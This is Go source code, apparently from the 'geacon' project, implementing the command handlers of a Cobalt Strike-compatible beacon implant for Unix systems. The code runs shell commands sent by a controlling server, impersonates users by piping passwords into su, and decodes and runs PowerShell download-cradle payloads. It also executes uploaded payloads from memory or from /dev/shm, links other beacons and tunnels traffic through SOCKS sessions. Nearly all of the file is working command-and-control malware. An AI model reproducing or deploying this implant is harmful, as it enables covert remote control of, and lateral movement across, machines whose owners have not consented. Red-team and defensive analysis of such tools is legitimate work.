package packet

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"geacon/cmd/config"
	"geacon/cmd/util"
	"geacon/cmd/util/memexec"
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/moby/sys/mountinfo"
)

const (
	CMD_TYPE_SPAWN         = 1  // TODO
	CMD_TYPE_EXIT          = 3  // IMPLEMENTED
	CMD_TYPE_SLEEP         = 4  // IMPLEMENTED
	CMD_TYPE_CD            = 5  // IMPLEMENTED
	CMD_TYPE_DATA_JITTER   = 6  // TODO
	CMD_TYPE_CHECKIN       = 8  // WONTFIX: only required for DNS beacons
	CMD_TYPE_DLL_INJECT    = 9  // WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
	CMD_TYPE_UPLOAD_START  = 10 // IMPLEMENTED
	CMD_TYPE_DOWNLOAD      = 11 // IMPLEMENTED
	CMD_TYPE_SOCKS_FWD     = 14 // TBD
	CMD_TYPE_SOCKS_SEND    = 15 // TBD
	CMD_TYPE_SOCKS_DIE     = 16 // TBD
	CMD_TYPE_PIPE_FWD      = 22 // IMPLEMENTED, is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
	CMD_TYPE_GETUID        = 27 // IMPLEMENTED
	CMD_TYPE_REVTOSELF     = 28 // IMPLEMENTED
	CMD_TYPE_LIST_PROCESS  = 32 // IMPLEMENTED
	CMD_TYPE_PWSH_IMPORT   = 37 // IMPLEMENTED
	CMD_TYPE_RUNAS         = 38 // IMPLEMENTED
	CMD_TYPE_PWD           = 39 // IMPLEMENTED
	CMD_TYPE_JOB_KILL      = 42 // TODO: requires job control to be implemented
	CMD_TYPE_DLL_INJECT_64 = 43 // WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
	CMD_TYPE_SPAWN_64      = 44 // TODO
	CMD_TYPE_IP_CONFIG     = 48 // TODO
	CMD_TYPE_LOGIN_USER    = 49 // IMPLEMENTED: Use as password setter function
	CMD_TYPE_PORT_FWD      = 50 // TODO
	CMD_TYPE_PORT_FWD_STOP = 51 // TODO
	CMD_TYPE_FILE_BROWSE   = 53 // IMPLEMENTED
	CMD_TYPE_DRIVES        = 55 // IMPLEMENTED
	CMD_TYPE_RM            = 56 // IMPLEMENTED
	CMD_TYPE_UPLOAD_LOOP   = 67 // IMPLEMENTED
	CMD_TYPE_LINK_EXPLICIT = 68 // TBD, SMB communication if possible
	CMD_TYPE_CP            = 73 // IMPLEMENTED
	CMD_TYPE_MV            = 74 // IMPLEMENTED
	CMD_TYPE_RUN_UNDER     = 76 // TBD, injection into UNIX processes might be out of scope of this project
	CMD_TYPE_GET_PRIVS     = 77 // TODO
	CMD_TYPE_SHELL         = 78 // IMPLEMENTED
	CMD_TYPE_HOST_PWSH_IMP = 79 // sends the port number where the file set by powershell-import should be hosted locally
	CMD_TYPE_LOAD_DLL      = 80 // WONTFIX: DLL only applies to windows clients. Maybe enable loading of shared object files?
	CMD_TYPE_REG_QUERY     = 81 // WONTFIX: No Registry on UNIX
	CMD_TYPE_PIVOT_LISTEN  = 82 // TBD
	CMD_TYPE_CONNECT       = 86 // IMPLEMENTED
	CMD_TYPE_EXEC_ASSEMBLY = 88 // TODO
	CMD_TYPE_SPAWNAS_64    = 94 // TODO
	CMD_TYPE_INLINE_EXEC   = 95 // WONTFIX: loading assemblies into memory and executing them is not in scope for this project for now
	// CMD_TYPE_DISCONNECT	  		= ??

	BEACON_RSP_OUTPUT_KEYSTROKES      = 1
	BEACON_RSP_DOWNLOAD_START         = 2
	BEACON_RSP_OUTPUT_SCREENSHOT      = 3
	BEACON_RSP_SOCKS_DIE              = 4
	BEACON_RSP_SOCKS_WRITE            = 5
	BEACON_RSP_SOCKS_RESUME           = 6
	BEACON_RSP_SOCKS_PORTFWD          = 7
	BEACON_RSP_DOWNLOAD_WRITE         = 8
	BEACON_RSP_DOWNLOAD_COMPLETE      = 9
	BEACON_RSP_BEACON_LINK            = 10
	BEACON_RSP_DEAD_PIPE              = 11
	BEACON_RSP_BEACON_CHECKIN         = 12
	BEACON_RSP_BEACON_POST_ERROR      = 13
	BEACON_RSP_PIPES_PING             = 14
	BEACON_RSP_BEACON_IMPERSONATED    = 15
	BEACON_RSP_BEACON_GETUID          = 16
	BEACON_RSP_BEACON_OUTPUT_PS       = 17
	BEACON_RSP_ERROR_CLOCK_SKEW       = 18
	BEACON_RSP_BEACON_GETCWD          = 19
	BEACON_RSP_BEACON_OUTPUT_JOBS     = 20
	BEACON_RSP_BEACON_OUTPUT_HASHES   = 21
	BEACON_RSP_FILE_BROWSE_RESULT     = 22
	BEACON_RSP_SOCKS_ACCEPT           = 23
	BEACON_RSP_BEACON_OUTPUT_NET      = 24
	BEACON_RSP_BEACON_OUTPUT_PORTSCAN = 25
	BEACON_RSP_BEACON_EXIT            = 26
	BEACON_RSP_OUTPUT                 = 30
	BEACON_RSP_BEACON_ERROR           = 31
	BEACON_RSP_OUTPUT_UTF8            = 32
)

var (
	errorBuf []byte
)

func SetShellPreLoadedFile(fileCmd []byte) {
	if len(fileCmd) > 0 {
		startPos := bytes.Index(fileCmd, []byte("$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\""))
		fileCmd = fileCmd[startPos+60:]
		endPos := bytes.Index(fileCmd, []byte("\"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"))
		fileCmd = fileCmd[:endPos]
		fmt.Printf("%s\n", fileCmd)
		config.ShellPreLoadedFile = string(fileCmd)
	} else {
		config.ShellPreLoadedFile = ""
	}

}

func ParseCommandShell(b []byte) (string, []byte) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	pathLen := ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	cmdLen := ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd
}

func Shell(path string, args []byte) []byte {
	var argsArray []string
	fmt.Printf("Running %s with the arguments '%s'\n", path, args)
	switch runtime.GOOS {
	case "darwin":
		path = "/bin/bash"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	case "linux":
		pathRes, err := exec.LookPath("bash")
		if err != nil {
			path = "/bin/sh"
		} else {
			path = pathRes
		}
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	}
	if config.StoredCredentials != nil {
		// take the command, but prepend it with a su command to run as a another user
		// echo '123456' | su - dummyuser -c "pwd; ls -al"

	}
	var cmd *exec.Cmd
	var cradle string
	if config.StoredCredentials != nil {
		// take the command, but prepend it with a su command to run as a another user
		// echo '123456' | su - dummyuser -c "pwd; ls -al"

		cradle = fmt.Sprintf("echo '%s' | su - %s -c \"$$CMD$$\"", config.StoredCredentials.Password, config.StoredCredentials.Username)
	}
	if strings.HasPrefix(fmt.Sprintf("%s", args), "powershell") {
		startPos := bytes.Index(args, []byte("powershell -nop -exec bypass -EncodedCommand "))
		args = args[startPos+45:]
		pwshCmd, err := powershellDecode(string(args))
		if err != nil {
			fmt.Printf("Decode error of command")
			return nil
		}
		fmt.Printf("Powershell command is: %s\n", pwshCmd)
		if config.ShellPreLoadedFile != "" {
			// command starts with download cradle like:
			// IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:33616/');

			cradleStartPos := bytes.Index([]byte(pwshCmd), []byte("/'); "))
			pwshCmd = string([]byte(pwshCmd)[cradleStartPos+4:])
			pwshCmd = strings.ReplaceAll(pwshCmd, "'", "\\'")
			pwshCmd = fmt.Sprintf("source <(echo '%s' | base64 -di | zcat) ; %s", config.ShellPreLoadedFile, pwshCmd)
			if cradle != "" {
				argsArray = []string{"-c", strings.ReplaceAll(cradle, "$$CMD$$", pwshCmd)}
			} else {
				argsArray = []string{"-c", pwshCmd}
			}
			fmt.Printf("[ %x ]", argsArray)
			cmd = exec.Command(path, argsArray...)
		} else {
			if cradle != "" {
				argsArray = []string{"-c", strings.ReplaceAll(cradle, "$$CMD$$", pwshCmd)}
			} else {
				argsArray = []string{"-c", pwshCmd}
			}

			fmt.Printf("[ %x ]", argsArray)
			cmd = exec.Command(path, argsArray...)
		}
		fmt.Printf("Executing '%s' with parameters '%s'\n", path, argsArray)
		fmt.Printf("Executing '%s'\n", cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Sprintf("exec failed with %s\n", err)
		}
		fmt.Printf("OUTPUT: %s\nERR: %s\n", out, err)
		return out
	} else {
		// startPos := bytes.Index(args, []byte("-c"))
		// args = args[startPos+3:]
		if cradle != "" {
			argsArray = []string{"-c", strings.ReplaceAll(cradle, "$$CMD$$", string(args))}
		} else {
			argsArray = []string{"-c", string(args)}
		}
		fmt.Printf("[ %x ]", argsArray)
		cmd = exec.Command(path, argsArray...)
		fmt.Printf("Executing '%s' with parameters '%s'\n", path, argsArray)
		fmt.Printf("Executing '%s'\n", cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Sprintf("exec failed with %s\n", err)
		}
		fmt.Printf("OUTPUT: %s\nERR: %s\n", out, err)
		return out
	}
}

func ParseRunAs(b []byte) []byte {
	// packet is build up: [length of domain (4 bytes)][domain][length of username (4 bytes)][username][length of password (4 bytes)][password][length of command (4 bytes)][command]
	buf := bytes.NewBuffer(b)

	domainLengthBuf := make([]byte, 4)
	_, err := buf.Read(domainLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	domainLength := ReadInt(domainLengthBuf)
	domainBuf := make([]byte, domainLength)
	_, err = buf.Read(domainBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	domain := string(domainBuf)

	usernameLengthBuf := make([]byte, 4)
	_, err = buf.Read(usernameLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	usernameLength := ReadInt(usernameLengthBuf)
	usernameBuf := make([]byte, usernameLength)
	_, err = buf.Read(usernameBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	username := string(usernameBuf)

	passwordLengthBuf := make([]byte, 4)
	_, err = buf.Read(passwordLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	passwordLength := ReadInt(passwordLengthBuf)
	passwordBuf := make([]byte, passwordLength)
	_, err = buf.Read(passwordBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	password := string(passwordBuf)

	commandLengthBuf := make([]byte, 4)
	_, err = buf.Read(commandLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	commandLength := ReadInt(commandLengthBuf)
	commandBuf := make([]byte, commandLength)
	_, err = buf.Read(commandBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	command := string(commandBuf)

	// store old StoredCredentials temporarily, set them to the one's we received, and restore after we are done
	tempStoredCredentials := config.StoredCredentials

	fmt.Printf("Setting credentials for user \"%s\\%s:%s\"", domain, username, password)
	config.StoredCredentials = &config.StoredCredential{domain, username, password}

	// we will overwrite the path variable either way, so let's set it to an empty string
	resultBuf := Shell("", []byte(command))

	// restore stored credentials
	config.StoredCredentials = tempStoredCredentials
	return resultBuf
}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func Upload(filePath string, fileContent []byte, cmdType int) int {
	if filePath == fmt.Sprintf("geacon-%d", config.GeaconId) {
		fmt.Printf("Let's assume we are trying to upload a geacon spawn buffer\n")

		if cmdType == CMD_TYPE_UPLOAD_START {
			config.SpawnBuffer = config.SpawnBuffer[:0]
			config.SpawnBuffer = append(config.SpawnBuffer, fileContent...)
		} else {
			config.SpawnBuffer = append(config.SpawnBuffer, fileContent...)
		}
		return 0
	} else {
		fileFlags := 0
		if cmdType == CMD_TYPE_UPLOAD_START {
			fileFlags = os.O_CREATE | os.O_TRUNC | os.O_WRONLY
		} else {
			fileFlags = os.O_APPEND | os.O_CREATE | os.O_WRONLY
		}
		fp, err := os.OpenFile(filePath, fileFlags, os.ModePerm)
		if err != nil {
			//fmt.Printf("file create err : %v\n", err)
			return 0
		}
		defer fp.Close()
		offset, err := fp.Write(fileContent)
		if err != nil {
			//fmt.Printf("file write err : %v\n", err)
			return 0
		}
		//fmt.Printf("the offset is %d\n",offset)
		return offset
	}
}
func ChangeCurrentDir(path []byte) {
	err := os.Chdir(string(path))
	if err != nil {
		//processError(err.Error())
		processErrorTest(40, 0, 0, err.Error())
	}
}
func GetCurrentDirectory() []byte {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	return []byte(result)
}

func RemoveFile(path []byte) {
	err := os.Remove(string(path))
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
	}
}

func ListDrives() []byte {
	partitions, err := mountinfo.GetMounts(nil)
	fmt.Printf("%s\n", partitions)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}

	var sb strings.Builder

	for _, partition := range partitions {
		sb.WriteString(fmt.Sprintf("%s\n", partition.Mountpoint))
	}

	return []byte(sb.String())
}

func GetUid() []byte {
	userDetails, err := user.Current()
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	result := fmt.Sprintf("%s (uid=%s, gid=%s)\n", userDetails.Username, userDetails.Uid, userDetails.Gid)
	return []byte(result)
}

func ParseCommandCopyMove(b []byte) ([]byte, []byte) {
	var fromPath []byte
	var toPath []byte
	buf := bytes.NewBuffer(b)
	fromPathLenBytes := make([]byte, 4)
	_, err := buf.Read(fromPathLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	} else {
		fromPathLen := ReadInt(fromPathLenBytes)
		fromPath = make([]byte, fromPathLen)
		_, err = buf.Read(fromPath)
		if err != nil {
			processErrorTest(0, 0, 0, err.Error())
			// panic(err)
		} else {
			toPathLenBytes := make([]byte, 4)
			_, err = buf.Read(toPathLenBytes)
			if err != nil {
				processErrorTest(0, 0, 0, err.Error())
				// panic(err)
			} else {
				toPathLen := ReadInt(toPathLenBytes)
				toPath = make([]byte, toPathLen)
				buf.Read(toPath)
			}
		}
	}

	return fromPath, toPath
}

func CopyFile(fromPath, toPath []byte) {
	in, err := os.Open(string(fromPath))
	if err != nil {
		fmt.Printf("File Open error: %s\n", err)
		processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err))
	} else {
		out, err := os.Create(string(toPath))
		if err != nil {
			fmt.Printf("File Open error: %s\n", err)
			processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err))

		} else {
			_, err = io.Copy(out, in)
			if err != nil {
				fmt.Printf("File Copy error: %s\n", err)
				processErrorTest(13, 0, 0, fmt.Sprintf("File copy error: %s", err))
			}
		}
		defer out.Close()
	}
	defer in.Close()
	in.Sync()
}

func MoveFile(oldLocation, newLocation []byte) {
	err := os.Rename(string(oldLocation), string(newLocation))
	if err != nil {
		fmt.Printf("File Move error: %s\n", err)
		processErrorTest(14, 0, 0, fmt.Sprintf("File move error: %s", err))
	}
}

func ListProcesses() []byte {
	var path string
	switch runtime.GOOS {
	case "darwin":
		path = "/bin/bash"
	case "linux":
		pathRes, err := exec.LookPath("bash")
		if err != nil {
			path = "/bin/sh"
		} else {
			path = pathRes
		}
	}

	// params := " -c 'ps ax -o ppid,pid,ruser,cmd'"
	params := []string{"-c", "ps ax -o '%P|%p|%u|%a'"}
	cmd := exec.Command(path, params...)
	// cmd := exec.Command(params)
	fmt.Printf("%s\n", cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Process list error: %s\n", err)
		return nil
	}
	var sb strings.Builder

	lines := strings.Split(string(out), "\n")
	for _, l := range lines[1:] {
		if l == "" {
			continue
		}
		proc := strings.SplitN(string(l), "|", 4)
		ppid := strings.TrimSpace(proc[0])
		pid := strings.TrimSpace(proc[1])
		username := strings.TrimSpace(proc[2])
		commandline := strings.TrimSpace(proc[3])
		fmt.Printf("PPID is %s\nPID is %s\nUSER is %s\nCMD is %s\n\n", ppid, pid, username, commandline)

		// for whatever reason, Cobalt Strike expects the output in the format
		// PPID <TAB> PID <TAB> Name <TAB> Arch <TAB> Session <TAB> User
		//
		// As arch and session are not really a thing in UNIX, we just leave these fields blank
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t\t%s\n", commandline, ppid, pid, username))
	}

	return []byte(sb.String())
}

func Spawn(arch string, b []byte) {

	buf := bytes.NewBuffer(b)

	payloadSupposedLengthBuf := make([]byte, buf.Len())
	_, err := buf.Read(payloadSupposedLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	payloadSupposedLengthString := string(payloadSupposedLengthBuf)
	fmt.Printf("String length of payload expected: %s\n\n", payloadSupposedLengthString)
	payloadSupposedLength, err := strconv.Atoi(payloadSupposedLengthString)

	fmt.Printf("Length of payload expected: %d\n\n", payloadSupposedLength)

	if len(config.SpawnBuffer) == payloadSupposedLength {
		fmt.Printf("Spawning new process for arch %s\n", arch)
		exe, err := memexec.New(config.SpawnBuffer)
		if err != nil {
			fmt.Println(err.Error())
			panic(err)
		}
		defer exe.Close()

		cmd := exe.Command()
		// run detached
		err = cmd.Start()
		if err != nil {
			panic(err)
		}
		err = cmd.Process.Release()
		if err != nil {
			fmt.Println(err.Error())
		}
		fmt.Printf("Spawned new process successfully!\n")
	} else {
		fmt.Printf("Supposed length of payload is not equal to the payload we have stored. Aborting!\n")
		processErrorTest(0, 0, 0, "Supposed length of payload is not equal to the payload we have stored.")
	}
}

func SpawnAs(arch string, b []byte) {
	buf := bytes.NewBuffer(b)

	// domain
	domainLenBytes := make([]byte, 4)
	_, err := buf.Read(domainLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	domainLen := ReadInt(domainLenBytes)
	domain := make([]byte, domainLen)
	_, err = buf.Read(domain)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	// username
	usernameLenBytes := make([]byte, 4)
	_, err = buf.Read(usernameLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	usernameLen := ReadInt(usernameLenBytes)
	username := make([]byte, usernameLen)
	_, err = buf.Read(username)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	// password
	passwordLenBytes := make([]byte, 4)
	_, err = buf.Read(passwordLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	passwordLen := ReadInt(passwordLenBytes)
	password := make([]byte, passwordLen)
	_, err = buf.Read(password)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	payloadSupposedLengthBuf := make([]byte, buf.Len())
	_, err = buf.Read(payloadSupposedLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	payloadSupposedLengthString := string(payloadSupposedLengthBuf)
	fmt.Printf("String length of payload expected: %s\n\n", payloadSupposedLengthString)
	payloadSupposedLength, err := strconv.Atoi(payloadSupposedLengthString)

	fmt.Printf("Length of payload expected: %d\n\n", payloadSupposedLength)

	if len(config.SpawnBuffer) == payloadSupposedLength {
		fmt.Printf("Spawning new process for arch %s\n", arch)
		exe, err := memexec.New(config.SpawnBuffer)
		if err != nil {
			fmt.Println(err.Error())
			panic(err)
		}
		defer exe.Close()

		fmt.Printf("Attempting to run as user %s.\nCopying file to /dev/shm to execute as another user.\n", username)
		path := fmt.Sprintf("/dev/shm/%d", os.Getpid())

		CopyFile([]byte(exe.File().Name()), []byte(path))
		err = os.Chmod(path, 0o555)
		if err != nil {
			panic(err)
		}

		fmt.Printf("PATH: %s", path)

		cradle := fmt.Sprintf("echo '%s' | su - %s -c %s", password, username, path)
		args := []string{"-c", cradle}
		cmd := exec.Command("/bin/sh", args...)

		// run detached
		fmt.Printf("CMD is: %s\n", cmd.Args)
		time.Sleep(30 * time.Second)

		err = cmd.Start()
		if err != nil {
			panic(err)
		}
		// err = cmd.Process.Release()
		// if err != nil {
		// 	fmt.Println(err.Error())
		// }
		fmt.Printf("%d\n", cmd.Process.Pid)

		err = os.Remove(path)
		if err != nil {
			processErrorTest(0, 0, 0, err.Error())
		}
		fmt.Printf("Cleaning up file %s .\n", path)

		fmt.Printf("Spawned new process successfully!\n")
	} else {
		fmt.Printf("Supposed length of payload is not equal to the payload we have stored. Aborting!\n")
		processErrorTest(0, 0, 0, "Supposed length of payload is not equal to the payload we have stored.")
	}
}

func ParseCommandConnect(b []byte) ([]byte, uint16) {
	// data is 2 Bytes for port, 4 Bytes for Address.
	// As there is no data in the buffer apart from that, we just use buf.Len() to get the remainder of available bytes for the address.
	buf := bytes.NewBuffer(b)

	fmt.Printf("Remaining bytes: %d\n", buf.Len())
	portRaw := make([]byte, 2)
	_, err := buf.Read(portRaw)
	port := ReadShort(portRaw)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	fmt.Printf("Port is %d\n", port)

	fmt.Printf("Remaining bytes: %d\n", buf.Len())

	addr := make([]byte, buf.Len())
	_, err = buf.Read(addr)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	fmt.Printf("Address is %s\n", addr)

	// return addr, port
	return addr, port
}

func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {

	var beaconId int
	var encryptedMetaInfo []byte

	dialer := net.Dialer{Timeout: 5 * time.Millisecond}
	fmt.Printf("Initiating connection to %s:%d\n", addr, port)
	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", addr, port))
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		processErrorTest(68, 0, 0, "")
		// panic(err)
		return -1, nil
	} else {
		initialMessage := make([]byte, 4)
		bytesRead, err := conn.Read(initialMessage)
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			// panic(err)
			processErrorTest(68, 0, 0, "")
			return -1, nil
		} else {
			fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, initialMessage)

			message := make([]byte, 140)
			bytesRead, err = conn.Read(message)
			if err != nil {
				processErrorTest(68, 0, 0, "")
				// panic(err)
				return -1, nil
			} else {
				trimmedMessage := message[:bytesRead]
				fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, trimmedMessage)
				fmt.Printf("[ATT]: %d bytes left to read!\nData not read: %x\n\n", len(message[bytesRead:]), message[bytesRead:])

				// attempt to xor the second message with the first as a key
				// unmaskedMessage := unmask(util.BytesCombine(initialMessage, trimmedMessage))

				fmt.Printf("Let's assume we start with a beacon ID, which is apparently a LittleEndian UInt32, and therefore 4 bytes long \n")
				buf := bytes.NewBuffer(trimmedMessage)
				beaconIdLen := make([]byte, 4)
				buf.Read(beaconIdLen)
				beaconId = int(ReadLittleInt(beaconIdLen))
				fmt.Printf("Beacon ID  %d\n", beaconId)

				// The rest of the payload are 128 bytes, the exact length allowed for RSA decrypt on the team server. Coincidence? I think not!
				encryptedMetaInfo = trimmedMessage[4:132]
				fmt.Printf("Beacon metainfo  %x\n", encryptedMetaInfo)

				AddTcpBeaconLink(beaconId, conn, 0, encryptedMetaInfo)
				return beaconId, encryptedMetaInfo
			}
		}
	}

	// return beaconId, encryptedMetaInfo

}

func ParsePipeForward(b []byte) (uint32, []byte) {
	// Current assumption:
	// First 4 Bytes is beacon ID, followed by another 4 bytes for the
	// length of the command, and n bytes for the actual command.

	var cmdBuf []byte
	buf := bytes.NewBuffer(b)
	fmt.Printf("Received cmdBuf:\n[ %x ]\n\n", b)

	fmt.Printf("Remaining bytes: %d\n", buf.Len())
	beaconIdRaw := make([]byte, 4)
	_, err := buf.Read(beaconIdRaw)
	beaconId := ReadInt(beaconIdRaw)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
		return 0, nil
	}

	fmt.Printf("Beacon ID is %d\n", beaconId)

	fmt.Printf("Remaining bytes: %d\n", buf.Len())

	if buf.Len() > 0 {
		cmdBufLenBytes := make([]byte, 4)
		_, err = buf.Read(cmdBufLenBytes)
		if err != nil {
			processErrorTest(0, 0, 0, err.Error())
			return 0, nil
		}
		cmdBufLen := ReadInt(cmdBufLenBytes)
		cmdBuf = make([]byte, cmdBufLen)
		_, err = buf.Read(cmdBuf)
		if err != nil {
			processErrorTest(0, 0, 0, err.Error())
			// panic(err)
			return 0, nil
		}
	} else {
		cmdBuf = []byte{00, 00, 00, 00}
	}

	fmt.Printf("cmdBuf for beacon %d is %s\n", beaconId, cmdBuf)

	// return addr, port
	return beaconId, cmdBuf
}

func ParseSocksInitTraffic(b []byte) []byte {
	// traffic consists of 4 bytes of what I assume is a client identifier, 2 bytes for the destination port, and 8 bytes for an address.
	// Implementation plan would be to create a list of socks sessions, put each in a go subroutine and collect all output on every execution loop somehow.
	// TODO: determine how the format changes if SOCKS4a is used to send an address instead of an IP address
	// reference for socks4a implementation: https://github.com/henkman/socks4a/blob/master/socks4a.go
	buf := bytes.NewBuffer(b)

	clientIdBuf := make([]byte, 4)
	_, err := buf.Read(clientIdBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	clientId := ReadInt(clientIdBuf)

	fmt.Printf("ClientId is: %d\n", clientId)

	// if client identifier is exists in our list, write to created session, else create a new session for the provided port and address?
	portBuf := make([]byte, 2)
	_, err = buf.Read(portBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	port := ReadShort(portBuf)
	fmt.Printf("Port is: %d\n", port)

	addrBuf := make([]byte, len(b[6:]))
	_, err = buf.Read(addrBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	origAddr := string(addrBuf)
	fmt.Printf("Address is: %s\n", origAddr)

	addr, err := net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", origAddr, port))
	if err != nil {
		fmt.Printf("ERROR RESOLVING ADDR: %s\n", err.Error())
		processErrorTest(68, 0, 0, fmt.Sprintf("%s:%d", addr.IP, addr.Port))
		return nil
	}

	conn, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		fmt.Printf("ERROR DIALING ADDR: %s\n", err.Error())
		processErrorTest(68, 0, 0, fmt.Sprintf("%s:%d", addr.IP, addr.Port))
		return nil
	}
	sess := &config.SocksSession{int(clientId), origAddr, int(port), conn, nil}
	config.SocksSessions = append(config.SocksSessions, sess)
	go SocksResListen(sess)

	fmt.Printf("Client %d wants to send data to %s:%d\n", clientId, addr, port)
	// return MakePacket(BEACON_RSP_SOCKS_ACCEPT, append(WriteLittleInt(1337), clientIdBuf...))
	return MakePacket(BEACON_RSP_SOCKS_RESUME, WriteInt(int(clientId)))
}

func ParseSocksTraffic(b []byte) {
	// check if the client id is present in any of our current socks session, else send an error
	// if present, just raw dump the traffic into the socket we have open, and send back the response
	// as the response might take some time, we will put this into a go subroutine, and check if there is something to report on every tick of the beacon
	buf := bytes.NewBuffer(b)

	clientIdBuf := make([]byte, 4)
	_, err := buf.Read(clientIdBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
	} else {
		clientId := ReadInt(clientIdBuf)

		trafficBuf := make([]byte, len(b[4:]))
		_, err = buf.Read(trafficBuf)
		if err != nil {
			processErrorTest(0, 0, 0, err.Error())
		} else {
			for i := range config.SocksSessions {
				if config.SocksSessions[i].Id == int(clientId) {
					// Found!
					// we only send data, reading a response will happen the next time we check in with that beacon either way
					fmt.Printf("Creating new thread to send data in background\n")
					go SocksSendReq(config.SocksSessions[i], trafficBuf)
				}
			}
		}
	}
}

func ParseSocksDie(b []byte) []byte {
	buf := bytes.NewBuffer(b)

	clientIdBuf := make([]byte, 4)
	_, err := buf.Read(clientIdBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
	} else {
		clientId := ReadInt(clientIdBuf)
		fmt.Printf("Killing SOCKS session for client id %d\n", clientId)
		for i := range config.SocksSessions {
			if config.SocksSessions[i].Id == int(clientId) {
				// Found!
				// close connection
				config.SocksSessions[i].Conn.Close()
				// reslicing to remove closed connection
				config.SocksSessions[i] = config.SocksSessions[len(config.SocksSessions)-1]
				config.SocksSessions = config.SocksSessions[:len(config.SocksSessions)-1]
				result := MakePacket(BEACON_RSP_SOCKS_DIE, WriteInt(int(clientId)))
				return result
			}
		}
	}
	return nil
}

func ParseLoginUser(b []byte) bool {
	// packet is build up: [length of domain (4 bytes)][domain][length of username (4 bytes)][username][length of password (4 bytes)][password]
	buf := bytes.NewBuffer(b)

	domainLengthBuf := make([]byte, 4)
	_, err := buf.Read(domainLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return false
	}
	domainLength := ReadInt(domainLengthBuf)
	domainBuf := make([]byte, domainLength)
	_, err = buf.Read(domainBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return false
	}
